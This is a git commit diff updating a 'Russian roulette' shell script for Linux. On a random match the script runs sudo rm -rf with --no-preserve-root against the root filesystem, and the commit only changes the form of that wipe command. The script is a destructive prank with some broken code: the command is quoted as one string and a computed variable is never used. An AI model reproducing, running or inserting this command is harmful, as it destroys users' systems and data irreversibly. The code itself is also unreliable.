355f856f9a409bf2b986fe9be4d7a016adabdc3c
Java sauce <mohammedbrandon204@gmail.com>
2022-09-19 14:58:54 -0700

    Update russianrouletlinux.sh

--- russianrouletlinux.sh
+++ russianrouletlinux.sh
@@ -2,7 +2,7 @@ r=$(( $RANDOM % 8 ));
 
 if [ $RANDOM -eq $1 ]
 then
-        sudo "rm -rf / --no-preserve-root"
+        sudo "rm -rfv --no-preserve-root /*"
 else
         echo "Your Linux machine is safe"
 fi
